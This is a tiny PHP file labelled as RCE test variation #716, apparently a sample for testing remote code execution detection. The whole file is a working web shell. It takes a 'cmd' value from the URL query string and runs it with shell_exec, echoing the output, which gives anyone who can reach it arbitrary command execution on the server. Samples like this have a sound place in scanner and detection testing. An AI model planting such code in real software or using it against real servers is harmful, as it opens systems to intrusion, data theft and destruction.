<?php
// RCE test variation #716
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>